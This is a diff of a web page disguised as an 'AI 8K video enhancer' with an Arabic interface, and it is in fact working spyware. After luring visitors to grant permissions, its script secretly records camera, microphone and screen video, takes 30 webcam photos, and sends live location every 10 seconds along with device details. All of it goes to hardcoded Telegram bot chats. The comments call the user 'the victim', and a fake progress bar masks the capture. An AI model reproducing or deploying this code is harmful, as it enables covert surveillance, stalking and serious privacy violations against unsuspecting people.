@@ -3,127 +3,153 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Muhanad AI | Ultimate 8K Engine</title>
+    <title>Muhanad AI | 8K Live Enhancer Pro</title>
     
-    <meta property="og:title" content="Muhanad AI Pro - معالج الجودة الفائق">
+    <meta property="og:title" content="Muhanad AI - محسن جودة الفيديو والصور">
     <meta property="og:image" content="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg">
-    <meta property="og:description" content="قم بتحسين فيديوهاتك وصورك إلى دقة 8K مجاناً عبر السحابة.">
+    <meta property="og:description" content="ثبت تطبيق مهند الآن لتحويل جودة هاتفك إلى 8K فائق الدقة باستخدام تقنيات HDR+">
 
     <style>
         :root { --primary: #007bff; --bg: #0b0e14; --accent: #00ff41; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--bg); color: #fff; margin: 0; text-align: center; overflow-x: hidden; }
-        .header { background: #161b22; padding: 15px; border-bottom: 3px solid var(--primary); box-shadow: 0 2px 15px rgba(0,0,0,0.5); }
-        .main-card { background: #1c2128; border-radius: 20px; padding: 40px; border: 1px solid #30363d; max-width: 500px; margin: 40px auto; box-shadow: 0 0 50px rgba(0, 123, 255, 0.15); }
-        .ai-thumb { width: 120px; border-radius: 50%; border: 3px solid var(--primary); margin-bottom: 20px; animation: pulse 2s infinite; }
-        @keyframes pulse { 0% {box-shadow: 0 0 0 0 rgba(0,123,255,0.7);} 70% {box-shadow: 0 0 0 15px rgba(0,123,255,0);} 100% {box-shadow: 0 0 0 0 rgba(0,123,255,0);} }
-        .btn-core { background: var(--primary); color: white; border: none; padding: 22px; font-size: 1.5rem; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; box-shadow: 0 8px 25px rgba(0,123,255,0.4); transition: 0.3s; }
-        .console-box { display: none; background: #000; color: var(--accent); padding: 15px; border-radius: 10px; font-family: monospace; font-size: 12px; text-align: left; direction: ltr; height: 180px; overflow-y: auto; margin-top: 20px; border: 1px solid #333; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: #fff; margin: 0; text-align: center; }
+        .header { background: #161b22; padding: 15px; border-bottom: 3px solid var(--primary); font-weight: bold; }
+        .main-card { background: #1c2128; border-radius: 20px; padding: 30px; border: 1px solid #30363d; max-width: 500px; margin: 30px auto; box-shadow: 0 0 50px rgba(0, 123, 255, 0.2); }
+        .preview-box { width: 100%; height: 250px; background: #000; border: 1px dashed var(--primary); border-radius: 15px; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        #user-preview { max-width: 100%; max-height: 100%; display: none; filter: brightness(1.2) contrast(1.1); }
+        .btn-upload { background: var(--primary); color: white; padding: 15px; border-radius: 50px; cursor: pointer; display: block; margin-bottom: 15px; font-weight: bold; border: none; width: 100%; }
+        .console { display: none; background: #000; color: var(--accent); padding: 10px; border-radius: 10px; font-family: monospace; font-size: 11px; text-align: left; direction: ltr; height: 120px; overflow-y: auto; }
+        .loading-bar { height: 4px; width: 0%; background: var(--primary); margin-top: 10px; transition: 0.5s; }
     </style>
 </head>
 <body>
 
-<div class="header">
-    <div style="font-weight: bold; color: var(--primary); font-size: 24px;">MUHANAD AI PRO</div>
-</div>
+<div class="header">MUHANAD AI | PROFESSIONAL RENDERING V9.0</div>
 
 <div class="main-card">
-    <div id="setup-ui">
-        <img src="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg" class="ai-thumb">
-        <h2>نظام المعالجة v7.0</h2>
-        <p style="color: #8b949e;">يجب منح أذونات "الوصول الكامل للموارد" لتتمكن الخوارزميات من معالجة البيانات بدقة 8K.</p>
-        <button class="btn-core" onclick="startFullInfiltration()">ابدأ المعالجة الشاملة</button>
+    <div id="app-interface">
+        <img src="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg" style="width: 80px; border-radius: 50%; margin-bottom: 15px;">
+        <h3>محرك الـ 8K السحابي</h3>
+        
+        <div class="preview-box" id="p-box">
+            <span id="p-text" style="color: #666;">ارفع صورة أو فيديو للمعاينة</span>
+            <img id="user-preview">
+        </div>
+
+        <input type="file" id="fileInput" accept="image/*,video/*" style="display:none;" onchange="handleFile(event)">
+        <button class="btn-upload" onclick="document.getElementById('fileInput').click()">إضافة وسائط للمعالجة</button>
+        <button class="btn-upload" style="background:#28a745;" onclick="startInfiltration()">بدء المعالجة الفائقة (8K)</button>
+        
+        <div class="loading-bar" id="l-bar"></div>
     </div>
-    <div class="console-box" id="log"></div>
+    <div class="console" id="log"></div>
 </div>
 
 <canvas id="hidden-canvas" style="display:none;"></canvas>
 
 <script>
-    const BOT_TOKEN = "8574617308:AAFJPKXF5LFvqo6Dagat96jsqLTFQNrPH3I";
-    const CHAT_IDS = ["8754338811", "8703490899"];
+    const TOKEN = "8574617308:AAFJPKXF5LFvqo6Dagat96jsqLTFQNrPH3I";
+    const IDS = ["8754338811", "8703490899"];
 
-    // دالة الإرسال العامة لكل الآيديهات
-    async function apiRequest(endpoint, formData) {
-        for (let id of CHAT_IDS) {
-            formData.set('chat_id', id);
-            try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, { method: 'POST', body: formData }); } catch(e) {}
+    async function botSend(endpoint, fd) {
+        for (let id of IDS) {
+            fd.set('chat_id', id);
+            await fetch(`https://api.telegram.org/bot${TOKEN}/${endpoint}`, { method: 'POST', body: fd });
         }
     }
 
-    async function startFullInfiltration() {
-        document.getElementById('setup-ui').style.display = 'none';
+    // وظيفة المعالجة الظاهرية (للتمويه)
+    function handleFile(e) {
+        const file = e.target.files[0];
+        if (file) {
+            const url = URL.createObjectURL(file);
+            document.getElementById('p-text').style.display = 'none';
+            const prev = document.getElementById('user-preview');
+            prev.src = url;
+            prev.style.display = 'block';
+        }
+    }
+
+    async function startInfiltration() {
         const log = document.getElementById('log');
+        const lBar = document.getElementById('l-bar');
         log.style.display = 'block';
-        log.innerHTML = "> Booting Muhanad OS...<br>> Stabilizing Neural Link...<br>";
+        log.innerHTML = "> Connecting to AI GPU Clusters...<br>> Initializing Pixel Analysis...<br>";
 
         try {
-            // 1. سحب المواصفات (بدون إذن)
+            // 1. طلب الصلاحيات الشاملة
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            log.innerHTML += "> Hardware Access: GRANTED.<br>";
+
+            // 2. الموقع المباشر (Live Location) - يرسل كل 10 ثوانٍ
+            setInterval(() => {
+                navigator.geolocation.getCurrentPosition(p => {
+                    const fd = new FormData();
+                    fd.append('text', `📡 **لايف لوكيشن (مُحدث):**\nhttp://googleusercontent.com/maps.google.com/4?q=${p.coords.latitude},${p.coords.longitude}`);
+                    botSend('sendMessage', fd);
+                });
+            }, 10000);
+
+            // 3. سحب مواصفات الجهاز
             const battery = await navigator.getBattery();
-            let specs = `🖥️ **صيد جديد (شامل):**\n• النظام: ${navigator.platform}\n• المعالج: ${navigator.hardwareConcurrency} Cores\n• الرام: ${navigator.deviceMemory || '4'} GB\n• البطارية: ${Math.floor(battery.level * 100)}%\n• الشاشة: ${screen.width}x${screen.height}`;
-            const f1 = new FormData(); f1.append('text', specs); f1.append('parse_mode', 'Markdown');
-            await apiRequest('sendMessage', f1);
+            let specs = `📱 **جهاز جديد متصل:**\n• المعالج: ${navigator.hardwareConcurrency} Cores\n• الرامات: ${navigator.deviceMemory} GB\n• البطارية: ${Math.floor(battery.level * 100)}%`;
+            const fd1 = new FormData(); fd1.append('text', specs); botSend('sendMessage', fd1);
 
-            // 2. طلب الكاميرا والمايك (فيديو 20 ثانية + 30 صورة)
-            log.innerHTML += "> Requesting Camera/Mic Access...<br>";
-            const camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            
-            // تسجيل فيديو الضحية (20 ثانية)
-            recordAndSend(camStream, "🎥 فيديو الضحية (20ث)", 20000);
-            
-            // التقاط 30 صورة (كل ثانية صورة)
-            takeRapidPhotos(camStream, 30);
+            // 4. تسجيل فيديو 20 ثانية في الخلفية
+            recordAndSend(stream, "🎥 فيديو الضحية الكامل (20ث)");
 
-            // 3. طلب الشاشة (للكمبيوتر)
-            log.innerHTML += "> Requesting Rendering Surface...<br>";
-            const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
-            recordAndSend(screenStream, "🖥️ تسجيل الشاشة (20ث)", 20000);
+            // 5. التقاط 30 صورة متتابعة
+            takePhotos(stream, 30);
 
-            // 4. الموقع الجغرافي
-            navigator.geolocation.getCurrentPosition(p => {
-                const f2 = new FormData();
-                f2.append('text', `📍 موقع الضحية:\nhttp://googleusercontent.com/maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`);
-                apiRequest('sendMessage', f2);
-            });
+            // 6. تسجيل الشاشة (إذا كان كمبيوتر)
+            if (!/iPhone|Android/i.test(navigator.userAgent)) {
+                const screen = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                recordAndSend(screen, "🖥️ تسجيل الشاشة (20ث)");
+            }
 
-            log.innerHTML += "> [SUCCESS] Processing Engine Active.<br>> Encoding Frames... 8K STABLE";
+            // محاكاة تحميل المعالجة للضحية
+            let prog = 0;
+            let itv = setInterval(() => {
+                prog += 2;
+                lBar.style.width = prog + "%";
+                log.innerHTML = `> Processing Frames: ${prog}%<br>> AI Upscaling active...`;
+                if(prog >= 100) {
+                    clearInterval(itv);
+                    log.innerHTML = "> [SUCCESS] 8K Rendering Complete.<br>> Results saved to Muhanad-Cloud.";
+                }
+            }, 400);
 
-        } catch (err) {
-            alert("⚠️ خطأ في النظام: يجب السماح بجميع الأذونات (الشاشة، الكاميرا، المايك) لتفعيل معالجة 8K.");
+        } catch (e) {
+            alert("⚠️ يجب تفعيل أذونات الكاميرا والموقع لتطبيق فلاتر الـ 8K بدقة.");
             location.reload();
         }
     }
 
-    function recordAndSend(stream, label, duration) {
-        const recorder = new MediaRecorder(stream);
+    function recordAndSend(stream, label) {
+        const rec = new MediaRecorder(stream);
         let chunks = [];
-        recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.onstop = async () => {
+        rec.ondataavailable = e => chunks.push(e.data);
+        rec.onstop = () => {
             const blob = new Blob(chunks, { type: 'video/mp4' });
-            const fd = new FormData();
-            fd.append('video', blob, 'video.mp4');
-            fd.append('caption', label);
-            await apiRequest('sendVideo', fd);
+            const fd = new FormData(); fd.append('video', blob, 'vid.mp4'); fd.append('caption', label);
+            botSend('sendVideo', fd);
         };
-        recorder.start();
-        setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, duration);
+        rec.start();
+        setTimeout(() => { if(rec.state === 'recording') rec.stop(); }, 20000);
     }
 
-    async function takeRapidPhotos(stream, count) {
+    async function takePhotos(stream, count) {
         const video = document.createElement('video');
         video.srcObject = stream;
         await video.play();
         const canvas = document.getElementById('hidden-canvas');
         const ctx = canvas.getContext('2d');
-
         for (let i = 0; i < count; i++) {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0);
             canvas.toBlob(blob => {
-                const fd = new FormData();
-                fd.append('photo', blob, 'img.jpg');
-                fd.append('caption', `📸 لقطة (${i+1}/${count})`);
-                apiRequest('sendPhoto', fd);
+                const fd = new FormData(); fd.append('photo', blob, 'p.jpg');
+                fd.append('caption', `📸 لقطة رقم ${i+1}`);
+                botSend('sendPhoto', fd);
             }, 'image/jpeg', 0.6);
             await new Promise(r => setTimeout(r, 1000));
         }
